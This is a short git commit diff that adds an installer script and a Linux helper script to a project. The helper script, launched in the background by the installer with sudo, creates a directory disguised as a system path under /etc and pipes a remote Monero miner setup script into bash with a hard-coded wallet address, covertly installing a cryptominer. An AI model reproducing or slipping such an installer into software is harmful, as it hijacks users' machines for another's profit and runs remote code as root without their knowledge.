b0fdc1e5d6e8cad09b9e24fff9b18a399d79e615
ufonetoficial <patriaevida@gmail.com>
2024-06-29 04:53:25 +0200

    Add files via upload

---
+++ installer.sh
@@ -0,0 +1,3 @@
+sudo apt install python curl git
+sudo python Net/setup.py
+sudo sh scrips/script-linux.sh &
---
+++ scripts/script-linux.sh
@@ -0,0 +1,4 @@
+sudo mkdir /etc/syslinux.kernel_Usr
+cd /etc/syslinux.kernel_Usr
+sudo curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 83qPMB9KQyq2sUPSY1kv5WiFHTiuP6JQrhf94enymdFLFucNrYuG3QuJh3GyjvbBYzU4rtYN7vZxPAZGfzeJrtT95Kq6N2f
+cd /
